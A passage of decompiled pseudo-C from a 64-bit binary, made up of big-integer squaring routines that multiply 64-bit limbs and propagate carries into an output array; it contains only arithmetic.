  v238 = *((_QWORD *)&v236 + 1) + v234;
  v239 = (v238 < *((_QWORD *)&v236 + 1)) + v235;
  v240 = a2[6] * (unsigned __int128)a2[8];
  *(_QWORD *)&v240 = v237 + v240;
  *((_QWORD *)&v240 + 1) += (unsigned __int64)v240 < v237;
  v241 = *((_QWORD *)&v240 + 1) + v238;
  v242 = 2 * v240;
  *((_QWORD *)&v13 + 1) = (v241 < *((_QWORD *)&v240 + 1)) + v239;
  *(_QWORD *)&v13 = v241;
  v243 = v13 >> 63;
  *((_QWORD *)&v13 + 1) = v241;
  *(_QWORD *)&v13 = v240;
  v244 = a2[7] * (unsigned __int128)a2[7];
  *(_QWORD *)&v244 = v242 + v244;
  *((_QWORD *)&v244 + 1) += (unsigned __int64)v244 < v242;
  v245 = v244 + v217;
  v246 = *((_QWORD *)&v244 + 1) + (v13 >> 63);
  a1[14] = v245;
  v247 = (v245 < (unsigned __int64)v244) + v218;
  v248 = v246 + v247;
  v249 = (v246 < *((_QWORD *)&v244 + 1)) + (v246 + v247 < v247) + v243;
  v250 = *a2 * (unsigned __int128)a2[15];
  v251 = a2[1] * (unsigned __int128)a2[14];
  v252 = v250 + v251;
  *((_QWORD *)&v251 + 1) += (_QWORD)v250 + (_QWORD)v251 < (unsigned __int64)v250;
  v253 = *((_QWORD *)&v251 + 1) + *((_QWORD *)&v250 + 1);
  v254 = *((_QWORD *)&v251 + 1) + *((_QWORD *)&v250 + 1) < *((_QWORD *)&v251 + 1);
  v255 = a2[2] * (unsigned __int128)a2[13];
  v256 = v252 + v255;
  *((_QWORD *)&v255 + 1) += v252 + (unsigned __int64)v255 < v252;
  v257 = *((_QWORD *)&v255 + 1) + v253;
  v258 = (v257 < *((_QWORD *)&v255 + 1)) + v254;
  v259 = a2[3] * (unsigned __int128)a2[12];
  v260 = v256 + v259;
  *((_QWORD *)&v259 + 1) += v256 + (unsigned __int64)v259 < v256;
  v261 = *((_QWORD *)&v259 + 1) + v257;
  v262 = (v261 < *((_QWORD *)&v259 + 1)) + v258;
  v263 = a2[4] * (unsigned __int128)a2[11];
  v264 = v260 + v263;
  *((_QWORD *)&v263 + 1) += v260 + (unsigned __int64)v263 < v260;
  v265 = *((_QWORD *)&v263 + 1) + v261;
  v266 = (v265 < *((_QWORD *)&v263 + 1)) + v262;
  v267 = a2[5] * (unsigned __int128)a2[10];
  v268 = v264 + v267;
  *((_QWORD *)&v267 + 1) += v264 + (unsigned __int64)v267 < v264;
  v269 = *((_QWORD *)&v267 + 1) + v265;
  v270 = (v269 < *((_QWORD *)&v267 + 1)) + v266;
  v271 = a2[6] * (unsigned __int128)a2[9];
  v272 = v268 + v271;
  *((_QWORD *)&v271 + 1) += v268 + (unsigned __int64)v271 < v268;
  v273 = *((_QWORD *)&v271 + 1) + v269;
  v274 = (v273 < *((_QWORD *)&v271 + 1)) + v270;
  v275 = a2[7] * (unsigned __int128)a2[8];
  *(_QWORD *)&v275 = v272 + v275;
  *((_QWORD *)&v275 + 1) += (unsigned __int64)v275 < v272;
  v276 = *((_QWORD *)&v275 + 1) + v273;
  v277 = v248 + 2 * v275;
  a1[15] = v277;
  *((_QWORD *)&v13 + 1) = (v276 < *((_QWORD *)&v275 + 1)) + v274;
  *(_QWORD *)&v13 = v276;
  v278 = v13 >> 63;
  *((_QWORD *)&v13 + 1) = v276;
  *(_QWORD *)&v13 = v275;
  v279 = (v277 < 2 * (__int64)v275) + v249;
  v280 = (v13 >> 63) + v279;
  v281 = (v280 < v279) + v278;
  v282 = a2[1] * (unsigned __int128)a2[15];
  v283 = a2[2] * (unsigned __int128)a2[14];
  v284 = v282 + v283;
  *((_QWORD *)&v283 + 1) += (_QWORD)v282 + (_QWORD)v283 < (unsigned __int64)v282;
  v285 = *((_QWORD *)&v283 + 1) + *((_QWORD *)&v282 + 1);
  v286 = *((_QWORD *)&v283 + 1) + *((_QWORD *)&v282 + 1) < *((_QWORD *)&v283 + 1);
  v287 = a2[3] * (unsigned __int128)a2[13];
  v288 = v284 + v287;
  *((_QWORD *)&v287 + 1) += v284 + (unsigned __int64)v287 < v284;
  v289 = *((_QWORD *)&v287 + 1) + v285;
  v290 = (v289 < *((_QWORD *)&v287 + 1)) + v286;
  v291 = a2[4] * (unsigned __int128)a2[12];
  v292 = v288 + v291;
  *((_QWORD *)&v291 + 1) += v288 + (unsigned __int64)v291 < v288;
  v293 = *((_QWORD *)&v291 + 1) + v289;
  v294 = (v293 < *((_QWORD *)&v291 + 1)) + v290;
  v295 = a2[5] * (unsigned __int128)a2[11];
  v296 = v292 + v295;
  *((_QWORD *)&v295 + 1) += v292 + (unsigned __int64)v295 < v292;
  v297 = *((_QWORD *)&v295 + 1) + v293;
  v298 = (v297 < *((_QWORD *)&v295 + 1)) + v294;
  v299 = a2[6] * (unsigned __int128)a2[10];
  v300 = v296 + v299;
  *((_QWORD *)&v299 + 1) += v296 + (unsigned __int64)v299 < v296;
  v301 = *((_QWORD *)&v299 + 1) + v297;
  v302 = (v301 < *((_QWORD *)&v299 + 1)) + v298;
  v303 = a2[7] * (unsigned __int128)a2[9];
  *(_QWORD *)&v303 = v300 + v303;
  *((_QWORD *)&v303 + 1) += (unsigned __int64)v303 < v300;
  v304 = *((_QWORD *)&v303 + 1) + v301;
  v305 = 2 * v303;
  *((_QWORD *)&v13 + 1) = (v304 < *((_QWORD *)&v303 + 1)) + v302;
  *(_QWORD *)&v13 = v304;
  v306 = v13 >> 63;
  *((_QWORD *)&v13 + 1) = v304;
  *(_QWORD *)&v13 = v303;
  v307 = a2[8] * (unsigned __int128)a2[8];
  *(_QWORD *)&v307 = v305 + v307;
  *((_QWORD *)&v307 + 1) += (unsigned __int64)v307 < v305;
  v308 = v307 + v280;
  v309 = *((_QWORD *)&v307 + 1) + (v13 >> 63);
  a1[16] = v308;
  v310 = (v308 < (unsigned __int64)v307) + v281;
  v311 = v309 + v310;
  v312 = (v309 < *((_QWORD *)&v307 + 1)) + (v309 + v310 < v310) + v306;
  v313 = a2[2] * (unsigned __int128)a2[15];
  v314 = a2[3] * (unsigned __int128)a2[14];
  v315 = v313 + v314;
  *((_QWORD *)&v314 + 1) += (_QWORD)v313 + (_QWORD)v314 < (unsigned __int64)v313;
  v316 = *((_QWORD *)&v314 + 1) + *((_QWORD *)&v313 + 1);
  v317 = *((_QWORD *)&v314 + 1) + *((_QWORD *)&v313 + 1) < *((_QWORD *)&v314 + 1);
  v318 = a2[4] * (unsigned __int128)a2[13];
  v319 = v315 + v318;
  *((_QWORD *)&v318 + 1) += v315 + (unsigned __int64)v318 < v315;
  v320 = *((_QWORD *)&v318 + 1) + v316;
  v321 = (v320 < *((_QWORD *)&v318 + 1)) + v317;
  v322 = a2[5] * (unsigned __int128)a2[12];
  v323 = v319 + v322;
  *((_QWORD *)&v322 + 1) += v319 + (unsigned __int64)v322 < v319;
  v324 = *((_QWORD *)&v322 + 1) + v320;
  v325 = (v324 < *((_QWORD *)&v322 + 1)) + v321;
  v326 = a2[6] * (unsigned __int128)a2[11];
  v327 = v323 + v326;
  *((_QWORD *)&v326 + 1) += v323 + (unsigned __int64)v326 < v323;
  v328 = *((_QWORD *)&v326 + 1) + v324;
  v329 = (v328 < *((_QWORD *)&v326 + 1)) + v325;
  v330 = a2[7] * (unsigned __int128)a2[10];
  v331 = v327 + v330;
  *((_QWORD *)&v330 + 1) += v327 + (unsigned __int64)v330 < v327;
  v332 = *((_QWORD *)&v330 + 1) + v328;
  v333 = (v332 < *((_QWORD *)&v330 + 1)) + v329;
  v334 = a2[8] * (unsigned __int128)a2[9];
  *(_QWORD *)&v334 = v331 + v334;
  *((_QWORD *)&v334 + 1) += (unsigned __int64)v334 < v331;
  v335 = *((_QWORD *)&v334 + 1) + v332;
  v336 = v311 + 2 * v334;
  *((_QWORD *)&v13 + 1) = (v335 < *((_QWORD *)&v334 + 1)) + v333;
  *(_QWORD *)&v13 = v335;
  v337 = v13 >> 63;
  *((_QWORD *)&v13 + 1) = v335;
  *(_QWORD *)&v13 = v334;
  v338 = (v336 < 2 * (__int64)v334) + v312;
  v339 = (v13 >> 63) + v338;
  v340 = (v339 < v338) + v337;
  a1[17] = v336;
  v341 = a2[3] * (unsigned __int128)a2[15];
  v342 = a2[4] * (unsigned __int128)a2[14];
  v343 = v341 + v342;
  *((_QWORD *)&v342 + 1) += (_QWORD)v341 + (_QWORD)v342 < (unsigned __int64)v341;
  v344 = *((_QWORD *)&v342 + 1) + *((_QWORD *)&v341 + 1);
  v345 = *((_QWORD *)&v342 + 1) + *((_QWORD *)&v341 + 1) < *((_QWORD *)&v342 + 1);
  v346 = a2[5] * (unsigned __int128)a2[13];
  v347 = v343 + v346;
  *((_QWORD *)&v346 + 1) += v343 + (unsigned __int64)v346 < v343;
  v348 = *((_QWORD *)&v346 + 1) + v344;
  v349 = (v348 < *((_QWORD *)&v346 + 1)) + v345;
  v350 = a2[6] * (unsigned __int128)a2[12];
  v351 = v347 + v350;
  *((_QWORD *)&v350 + 1) += v347 + (unsigned __int64)v350 < v347;
  v352 = *((_QWORD *)&v350 + 1) + v348;
  v353 = (v352 < *((_QWORD *)&v350 + 1)) + v349;
  v354 = a2[7] * (unsigned __int128)a2[11];
  v355 = v351 + v354;
  *((_QWORD *)&v354 + 1) += v351 + (unsigned __int64)v354 < v351;
  v356 = *((_QWORD *)&v354 + 1) + v352;
  v357 = (v356 < *((_QWORD *)&v354 + 1)) + v353;
  v358 = a2[8] * (unsigned __int128)a2[10];
  *(_QWORD *)&v358 = v355 + v358;
  *((_QWORD *)&v358 + 1) += (unsigned __int64)v358 < v355;
  v359 = *((_QWORD *)&v358 + 1) + v356;
  v360 = 2 * v358;
  *((_QWORD *)&v13 + 1) = (v359 < *((_QWORD *)&v358 + 1)) + v357;
  *(_QWORD *)&v13 = v359;
  v361 = v13 >> 63;
  *((_QWORD *)&v13 + 1) = v359;
  *(_QWORD *)&v13 = v358;
  v362 = a2[9] * (unsigned __int128)a2[9];
  *(_QWORD *)&v362 = v360 + v362;
  *((_QWORD *)&v362 + 1) += (unsigned __int64)v362 < v360;
  v363 = v362 + v339;
  v364 = *((_QWORD *)&v362 + 1) + (v13 >> 63);
  a1[18] = v363;
  v365 = (v363 < (unsigned __int64)v362) + v340;
  v366 = v364 + v365;
  v367 = (v364 < *((_QWORD *)&v362 + 1)) + (v364 + v365 < v365) + v361;
  v368 = a2[4] * (unsigned __int128)a2[15];
  v369 = a2[5] * (unsigned __int128)a2[14];
  v370 = v368 + v369;
  *((_QWORD *)&v369 + 1) += (_QWORD)v368 + (_QWORD)v369 < (unsigned __int64)v368;
  v371 = *((_QWORD *)&v369 + 1) + *((_QWORD *)&v368 + 1);
  v372 = *((_QWORD *)&v369 + 1) + *((_QWORD *)&v368 + 1) < *((_QWORD *)&v369 + 1);
  v373 = a2[6] * (unsigned __int128)a2[13];
  v374 = v370 + v373;
  *((_QWORD *)&v373 + 1) += v370 + (unsigned __int64)v373 < v370;
  v375 = *((_QWORD *)&v373 + 1) + v371;
  v376 = (v375 < *((_QWORD *)&v373 + 1)) + v372;
  v377 = a2[7] * (unsigned __int128)a2[12];
  v378 = v374 + v377;
  *((_QWORD *)&v377 + 1) += v374 + (unsigned __int64)v377 < v374;
  v379 = *((_QWORD *)&v377 + 1) + v375;
  v380 = (v379 < *((_QWORD *)&v377 + 1)) + v376;
  v381 = a2[8] * (unsigned __int128)a2[11];
  v382 = v378 + v381;
  *((_QWORD *)&v381 + 1) += v378 + (unsigned __int64)v381 < v378;
  v383 = *((_QWORD *)&v381 + 1) + v379;
  v384 = (v383 < *((_QWORD *)&v381 + 1)) + v380;
  v385 = a2[9] * (unsigned __int128)a2[10];
  *(_QWORD *)&v385 = v382 + v385;
  *((_QWORD *)&v385 + 1) += (unsigned __int64)v385 < v382;
  v386 = *((_QWORD *)&v385 + 1) + v383;
  v387 = v366 + 2 * v385;
  a1[19] = v387;
  *((_QWORD *)&v13 + 1) = (v386 < *((_QWORD *)&v385 + 1)) + v384;
  *(_QWORD *)&v13 = v386;
  v388 = v13 >> 63;
  *((_QWORD *)&v13 + 1) = v386;
  *(_QWORD *)&v13 = v385;
  v389 = (v387 < 2 * (__int64)v385) + v367;
  v390 = (v13 >> 63) + v389;
  v391 = (v390 < v389) + v388;
  v392 = a2[5] * (unsigned __int128)a2[15];
  v393 = a2[6] * (unsigned __int128)a2[14];
  v394 = v392 + v393;
  *((_QWORD *)&v393 + 1) += (_QWORD)v392 + (_QWORD)v393 < (unsigned __int64)v392;
  v395 = *((_QWORD *)&v393 + 1) + *((_QWORD *)&v392 + 1);
  v396 = *((_QWORD *)&v393 + 1) + *((_QWORD *)&v392 + 1) < *((_QWORD *)&v393 + 1);
  v397 = a2[7] * (unsigned __int128)a2[13];
  v398 = v394 + v397;
  *((_QWORD *)&v397 + 1) += v394 + (unsigned __int64)v397 < v394;
  v399 = *((_QWORD *)&v397 + 1) + v395;
  v400 = (v399 < *((_QWORD *)&v397 + 1)) + v396;
  v401 = a2[8] * (unsigned __int128)a2[12];
  v402 = v398 + v401;
  *((_QWORD *)&v401 + 1) += v398 + (unsigned __int64)v401 < v398;
  v403 = *((_QWORD *)&v401 + 1) + v399;
  v404 = (v403 < *((_QWORD *)&v401 + 1)) + v400;
  v405 = a2[9] * (unsigned __int128)a2[11];
  *(_QWORD *)&v405 = v402 + v405;
  *((_QWORD *)&v405 + 1) += (unsigned __int64)v405 < v402;
  v406 = *((_QWORD *)&v405 + 1) + v403;
  v407 = 2 * v405;
  *((_QWORD *)&v13 + 1) = (v406 < *((_QWORD *)&v405 + 1)) + v404;
  *(_QWORD *)&v13 = v406;
  v408 = v13 >> 63;
  *((_QWORD *)&v13 + 1) = v406;
  *(_QWORD *)&v13 = v405;
  v409 = a2[10] * (unsigned __int128)a2[10];
  *(_QWORD *)&v409 = v407 + v409;
  *((_QWORD *)&v409 + 1) += (unsigned __int64)v409 < v407;
  v410 = v409 + v390;
  v411 = *((_QWORD *)&v409 + 1) + (v13 >> 63);
  a1[20] = v410;
  v412 = (v410 < (unsigned __int64)v409) + v391;
  v413 = v411 + v412;
  v414 = (v411 < *((_QWORD *)&v409 + 1)) + (v411 + v412 < v412) + v408;
  v415 = a2[6] * (unsigned __int128)a2[15];
  v416 = a2[7] * (unsigned __int128)a2[14];
  v417 = v415 + v416;
  *((_QWORD *)&v416 + 1) += (_QWORD)v415 + (_QWORD)v416 < (unsigned __int64)v415;
  v418 = *((_QWORD *)&v416 + 1) + *((_QWORD *)&v415 + 1);
  v419 = *((_QWORD *)&v416 + 1) + *((_QWORD *)&v415 + 1) < *((_QWORD *)&v416 + 1);
  v420 = a2[8] * (unsigned __int128)a2[13];
  v421 = v417 + v420;
  *((_QWORD *)&v420 + 1) += v417 + (unsigned __int64)v420 < v417;
  v422 = *((_QWORD *)&v420 + 1) + v418;
  v423 = (v422 < *((_QWORD *)&v420 + 1)) + v419;
  v424 = a2[9] * (unsigned __int128)a2[12];
  v425 = v421 + v424;
  *((_QWORD *)&v424 + 1) += v421 + (unsigned __int64)v424 < v421;
  v426 = *((_QWORD *)&v424 + 1) + v422;
  v427 = (v426 < *((_QWORD *)&v424 + 1)) + v423;
  v428 = a2[10] * (unsigned __int128)a2[11];
  *(_QWORD *)&v428 = v425 + v428;
  *((_QWORD *)&v428 + 1) += (unsigned __int64)v428 < v425;
  v429 = *((_QWORD *)&v428 + 1) + v426;
  v430 = v413 + 2 * v428;
  a1[21] = v430;
  *((_QWORD *)&v13 + 1) = (v429 < *((_QWORD *)&v428 + 1)) + v427;
  *(_QWORD *)&v13 = v429;
  v431 = v13 >> 63;
  *((_QWORD *)&v13 + 1) = v429;
  *(_QWORD *)&v13 = v428;
  v432 = (v430 < 2 * (__int64)v428) + v414;
  v433 = (v13 >> 63) + v432;
  v434 = (v433 < v432) + v431;
  v435 = a2[7] * (unsigned __int128)a2[15];
  v436 = a2[8] * (unsigned __int128)a2[14];
  v437 = v435 + v436;
  *((_QWORD *)&v436 + 1) += (_QWORD)v435 + (_QWORD)v436 < (unsigned __int64)v435;
  v438 = *((_QWORD *)&v436 + 1) + *((_QWORD *)&v435 + 1);
  v439 = *((_QWORD *)&v436 + 1) + *((_QWORD *)&v435 + 1) < *((_QWORD *)&v436 + 1);
  v440 = a2[9] * (unsigned __int128)a2[13];
  v441 = v437 + v440;
  *((_QWORD *)&v440 + 1) += v437 + (unsigned __int64)v440 < v437;
  v442 = *((_QWORD *)&v440 + 1) + v438;
  v443 = (v442 < *((_QWORD *)&v440 + 1)) + v439;
  v444 = a2[10] * (unsigned __int128)a2[12];
  *(_QWORD *)&v444 = v441 + v444;
  *((_QWORD *)&v444 + 1) += (unsigned __int64)v444 < v441;
  v445 = *((_QWORD *)&v444 + 1) + v442;
  v446 = 2 * v444;
  *((_QWORD *)&v13 + 1) = (v445 < *((_QWORD *)&v444 + 1)) + v443;
  *(_QWORD *)&v13 = v445;
  v447 = v13 >> 63;
  *((_QWORD *)&v13 + 1) = v445;
  *(_QWORD *)&v13 = v444;
  v448 = a2[11] * (unsigned __int128)a2[11];
  *(_QWORD *)&v448 = v446 + v448;
  *((_QWORD *)&v448 + 1) += (unsigned __int64)v448 < v446;
  v449 = v448 + v433;
  v450 = *((_QWORD *)&v448 + 1) + (v13 >> 63);
  a1[22] = v449;
  v451 = (v449 < (unsigned __int64)v448) + v434;
  v452 = v450 + v451;
  v453 = (v450 < *((_QWORD *)&v448 + 1)) + (v450 + v451 < v451) + v447;
  v454 = a2[8] * (unsigned __int128)a2[15];
  v455 = a2[9] * (unsigned __int128)a2[14];
  v456 = v454 + v455;
  *((_QWORD *)&v455 + 1) += (_QWORD)v454 + (_QWORD)v455 < (unsigned __int64)v454;
  v457 = *((_QWORD *)&v455 + 1) + *((_QWORD *)&v454 + 1);
  v458 = *((_QWORD *)&v455 + 1) + *((_QWORD *)&v454 + 1) < *((_QWORD *)&v455 + 1);
  v459 = a2[10] * (unsigned __int128)a2[13];
  v460 = v456 + v459;
  *((_QWORD *)&v459 + 1) += v456 + (unsigned __int64)v459 < v456;
  v461 = *((_QWORD *)&v459 + 1) + v457;
  v462 = (v461 < *((_QWORD *)&v459 + 1)) + v458;
  v463 = a2[11] * (unsigned __int128)a2[12];
  *(_QWORD *)&v463 = v460 + v463;
  *((_QWORD *)&v463 + 1) += (unsigned __int64)v463 < v460;
  v464 = *((_QWORD *)&v463 + 1) + v461;
  v465 = v452 + 2 * v463;
  a1[23] = v465;
  *((_QWORD *)&v13 + 1) = (v464 < *((_QWORD *)&v463 + 1)) + v462;
  *(_QWORD *)&v13 = v464;
  v466 = v13 >> 63;
  *((_QWORD *)&v13 + 1) = v464;
  *(_QWORD *)&v13 = v463;
  v467 = (v465 < 2 * (__int64)v463) + v453;
  v468 = (v13 >> 63) + v467;
  v469 = (v468 < v467) + v466;
  v470 = a2[9] * (unsigned __int128)a2[15];
  v471 = a2[10] * (unsigned __int128)a2[14];
  v472 = v470 + v471;
  *((_QWORD *)&v471 + 1) += (_QWORD)v470 + (_QWORD)v471 < (unsigned __int64)v470;
  v473 = *((_QWORD *)&v471 + 1) + *((_QWORD *)&v470 + 1);
  v474 = *((_QWORD *)&v471 + 1) + *((_QWORD *)&v470 + 1) < *((_QWORD *)&v471 + 1);
  v475 = a2[11] * (unsigned __int128)a2[13];
  *(_QWORD *)&v475 = v472 + v475;
  v8 = (unsigned __int64)v475 < v472;
  v476 = 2 * v475;
  *((_QWORD *)&v475 + 1) += v8;
  v477 = *((_QWORD *)&v475 + 1) + v473;
  *((_QWORD *)&v13 + 1) = (v477 < *((_QWORD *)&v475 + 1)) + v474;
  *(_QWORD *)&v13 = v477;
  v478 = v13 >> 63;
  *((_QWORD *)&v13 + 1) = v477;
  *(_QWORD *)&v13 = v475;
  v479 = a2[12] * (unsigned __int128)a2[12];
  *(_QWORD *)&v479 = v476 + v479;
  *((_QWORD *)&v479 + 1) += (unsigned __int64)v479 < v476;
  v480 = v479 + v468;
  v481 = *((_QWORD *)&v479 + 1) + (v13 >> 63);
  a1[24] = v480;
  v482 = (v480 < (unsigned __int64)v479) + v469;
  v483 = v481 + v482;
  v484 = (v481 < *((_QWORD *)&v479 + 1)) + (v481 + v482 < v482) + v478;
  v485 = a2[10] * (unsigned __int128)a2[15];
  v486 = a2[11] * (unsigned __int128)a2[14];
  v487 = v485 + v486;
  *((_QWORD *)&v486 + 1) += (_QWORD)v485 + (_QWORD)v486 < (unsigned __int64)v485;
  v488 = *((_QWORD *)&v486 + 1) + *((_QWORD *)&v485 + 1);
  v489 = *((_QWORD *)&v486 + 1) + *((_QWORD *)&v485 + 1) < *((_QWORD *)&v486 + 1);
  v490 = a2[12] * (unsigned __int128)a2[13];
  *(_QWORD *)&v490 = v487 + v490;
  *((_QWORD *)&v490 + 1) += (unsigned __int64)v490 < v487;
  v491 = *((_QWORD *)&v490 + 1) + v488;
  v492 = v483 + 2 * v490;
  a1[25] = v492;
  *((_QWORD *)&v13 + 1) = (v491 < *((_QWORD *)&v490 + 1)) + v489;
  *(_QWORD *)&v13 = v491;
  v493 = v13 >> 63;
  *((_QWORD *)&v13 + 1) = v491;
  *(_QWORD *)&v13 = v490;
  v494 = (v492 < 2 * (__int64)v490) + v484;
  v495 = (v13 >> 63) + v494;
  v8 = v495 < v494;
  v496 = a2[11] * (unsigned __int128)a2[15];
  v497 = a2[12] * (unsigned __int128)a2[14];
  *(_QWORD *)&v497 = v496 + v497;
  *((_QWORD *)&v497 + 1) += (unsigned __int64)v497 < (unsigned __int64)v496;
  v498 = 2 * v497;
  *((_QWORD *)&v13 + 1) = *((_QWORD *)&v497 + 1) + *((_QWORD *)&v496 + 1) < *((_QWORD *)&v497 + 1);
  *(_QWORD *)&v13 = *((_QWORD *)&v497 + 1) + *((_QWORD *)&v496 + 1);
  v499 = v13 >> 63;
  *((_QWORD *)&v13 + 1) = *((_QWORD *)&v497 + 1) + *((_QWORD *)&v496 + 1);
  *(_QWORD *)&v13 = v497;
  v500 = a2[13] * (unsigned __int128)a2[13];
  *(_QWORD *)&v500 = v498 + v500;
  *((_QWORD *)&v500 + 1) += (unsigned __int64)v500 < v498;
  v501 = v500 + v495;
  v502 = *((_QWORD *)&v500 + 1) + (v13 >> 63);
  v503 = (v501 < (unsigned __int64)v500) + v8 + v493;
  a1[26] = v501;
  v504 = (v502 < *((_QWORD *)&v500 + 1)) + (v502 + v503 < v503) + v499;
  v505 = a2[12] * (unsigned __int128)a2[15];
  v506 = a2[13] * (unsigned __int128)a2[14];
  *(_QWORD *)&v506 = v505 + v506;
  *((_QWORD *)&v506 + 1) += (unsigned __int64)v506 < (unsigned __int64)v505;
  v507 = v502 + v503 + 2 * v506;
  a1[27] = v507;
  *((_QWORD *)&v13 + 1) = *((_QWORD *)&v506 + 1) + *((_QWORD *)&v505 + 1) < *((_QWORD *)&v506 + 1);
  *(_QWORD *)&v13 = *((_QWORD *)&v506 + 1) + *((_QWORD *)&v505 + 1);
  v508 = v13 >> 63;
  *((_QWORD *)&v13 + 1) = *((_QWORD *)&v506 + 1) + *((_QWORD *)&v505 + 1);
  *(_QWORD *)&v13 = v506;
  v509 = (v507 < 2 * (__int64)v506) + v504;
  v510 = (v13 >> 63) + v509;
  v511 = (v510 < v509) + v508;
  *(_QWORD *)&v13 = (a2[13] * (unsigned __int128)a2[15]) >> 64;
  v512 = 2 * a2[13] * a2[15];
  v513 = a2[14] * (unsigned __int128)a2[14];
  *(_QWORD *)&v513 = v512 + v513;
  *((_QWORD *)&v513 + 1) += (unsigned __int64)v513 < v512;
  v514 = v513 + v510;
  v515 = *((_QWORD *)&v513 + 1) + ((__int128)(a2[13] * (unsigned __int128)a2[15]) >> 63);
  a1[28] = v514;
  v516 = (v514 < (unsigned __int64)v513) + v511;
  v517 = (v515 < *((_QWORD *)&v513 + 1))
       + (v515 + v516 < v516)
       + (unsigned __int64)((__int128)(unsigned __int64)v13 >> 63);
  *(_QWORD *)&v13 = (a2[14] * (unsigned __int128)a2[15]) >> 64;
  v518 = v515 + v516 + 2 * a2[14] * a2[15];
  v519 = a2[14] * (unsigned __int128)a2[15] * 2;
  v8 = v518 < 2 * a2[14] * a2[15];
  a1[29] = v518;
  v520 = v8 + v517;
  v521 = *((_QWORD *)&v519 + 1) + v520;
  v522 = a2[15] * (unsigned __int128)a2[15];
  result = v521 + v522;
  a1[30] = result;
  a1[31] = (v521 < v520)
         + (unsigned __int64)((__int128)(unsigned __int64)v13 >> 63)
         + (result < v521)
         + *((_QWORD *)&v522 + 1);
  return result;
}

//----- (000000013F11B8B0) ----------------------------------------------------
unsigned __int64 __fastcall sub_13F11B8B0(_QWORD *a1, unsigned __int64 *a2)
{
  unsigned __int128 v3; // rax
  unsigned __int64 v4; // rt0
  unsigned __int64 v5; // r9
  unsigned __int128 v6; // rax
  bool v7; // cf
  unsigned __int64 v8; // r8
  unsigned __int128 v9; // rax
  unsigned __int64 result; // rax

  v3 = *a2 * (unsigned __int128)*a2;
  *a1 = v3;
  v4 = (*a2 * (unsigned __int128)a2[1]) >> 64;
  v5 = *((_QWORD *)&v3 + 1) + 2 * *a2 * a2[1];
  v6 = *a2 * (unsigned __int128)a2[1] * 2;
  v7 = v5 < 2 * *a2 * a2[1];
  a1[1] = v5;
  v8 = *((_QWORD *)&v6 + 1) + v7;
  v9 = a2[1] * (unsigned __int128)a2[1];
  result = v8 + v9;
  a1[2] = result;
  a1[3] = (v8 < v7) + (unsigned __int64)((__int128)v4 >> 63) + (result < v8) + *((_QWORD *)&v9 + 1);
  return result;
}

//----- (000000013F11B920) ----------------------------------------------------
unsigned __int64 __fastcall sub_13F11B920(_QWORD *a1, unsigned __int64 *a2)
{
  unsigned __int128 v4; // rax
  unsigned __int64 v5; // rt0
  unsigned __int64 v6; // r8
  unsigned __int128 v7; // rax
  bool v8; // cf
  unsigned __int64 v9; // r10
  unsigned __int64 v10; // r11
  __int64 v11; // rbx
  unsigned __int64 v12; // r8
  signed __int128 v13; // rt0
  unsigned __int128 v14; // rax
  unsigned __int64 v15; // r10
  unsigned __int64 v16; // r11
  unsigned __int64 v17; // rcx
  __int64 v18; // rbx
  unsigned __int128 v19; // kr00_16
  unsigned __int128 v20; // rax
  unsigned __int64 v21; // r9
  __int64 v22; // r11
  unsigned __int64 v23; // rbx
  unsigned __int64 v24; // r10
  unsigned __int64 v25; // r8
  unsigned __int128 v26; // rax
  unsigned __int64 v27; // r10
  unsigned __int64 v28; // rcx
  unsigned __int64 v29; // r11
  unsigned __int64 v30; // rbx
  unsigned __int64 v31; // r9
  unsigned __int128 v32; // rax
  unsigned __int64 v33; // rbx
  unsigned __int64 v34; // r8
  unsigned __int128 v35; // rax
  unsigned __int64 result; // rax

  v4 = *a2 * (unsigned __int128)*a2;
  *a1 = v4;
  v5 = (*a2 * (unsigned __int128)a2[1]) >> 64;
  v6 = *((_QWORD *)&v4 + 1) + 2 * *a2 * a2[1];
  v7 = *a2 * (unsigned __int128)a2[1] * 2;
  v8 = v6 < 2 * *a2 * a2[1];
  a1[1] = v6;
  v9 = *((_QWORD *)&v7 + 1) + v8;
  v10 = (v9 < v8) + (unsigned __int64)((__int128)v5 >> 63);
  v11 = (__int128)((*a2 * (unsigned __int128)a2[2]) >> 64) >> 63;
  v12 = 2 * *a2 * a2[2];
  v13 = *a2 * (unsigned __int128)a2[2];
  v14 = a2[1] * (unsigned __int128)a2[1];
  *(_QWORD *)&v14 = v12 + v14;
  *((_QWORD *)&v14 + 1) += (unsigned __int64)v14 < v12;
  v15 = v14 + v9;
  a1[2] = v15;
  v16 = (v15 < (unsigned __int64)v14) + v10;
  v17 = *((_QWORD *)&v14 + 1) + (v13 >> 63);
  v18 = (v17 + v16 < v16) + (v17 < *((_QWORD *)&v14 + 1)) + v11;
  v19 = *a2 * (unsigned __int128)a2[3];
  v20 = a2[1] * (unsigned __int128)a2[2];
  *(_QWORD *)&v20 = v19 + v20;
  *((_QWORD *)&v20 + 1) += (unsigned __int64)v20 < (unsigned __int64)v19;
  v21 = v17 + v16 + 2 * v20;
  a1[3] = v21;
  *((_QWORD *)&v13 + 1) = *((_QWORD *)&v20 + 1) + *((_QWORD *)&v19 + 1) < *((_QWORD *)&v20 + 1);
  *(_QWORD *)&v13 = *((_QWORD *)&v20 + 1) + *((_QWORD *)&v19 + 1);
  v22 = v13 >> 63;
  *((_QWORD *)&v13 + 1) = *((_QWORD *)&v20 + 1) + *((_QWORD *)&v19 + 1);
  *(_QWORD *)&v13 = v20;
  v23 = (v21 < 2 * (__int64)v20) + v18;
  v24 = (v13 >> 63) + v23;
  v8 = v24 < v23;
  *(_QWORD *)&v13 = (a2[1] * (unsigned __int128)a2[3]) >> 64;
  v25 = 2 * a2[1] * a2[3];
  v26 = a2[2] * (unsigned __int128)a2[2];
  *(_QWORD *)&v26 = v25 + v26;
  *((_QWORD *)&v26 + 1) += (unsigned __int64)v26 < v25;
  v27 = v26 + v24;
  v28 = *((_QWORD *)&v26 + 1) + ((__int128)(a2[1] * (unsigned __int128)a2[3]) >> 63);
  v29 = (v27 < (unsigned __int64)v26) + v8 + v22;
  a1[4] = v27;
  v30 = (v28 + v29 < v29) + (v28 < *((_QWORD *)&v26 + 1)) + (unsigned __int64)((__int128)(unsigned __int64)v13 >> 63);
  *(_QWORD *)&v13 = (a2[2] * (unsigned __int128)a2[3]) >> 64;
  v31 = v28 + v29 + 2 * a2[2] * a2[3];
  v32 = a2[2] * (unsigned __int128)a2[3] * 2;
  v8 = v31 < 2 * a2[2] * a2[3];
  a1[5] = v31;
  v33 = v8 + v30;
  v34 = *((_QWORD *)&v32 + 1) + v33;
  v35 = a2[3] * (unsigned __int128)a2[3];
  result = v34 + v35;
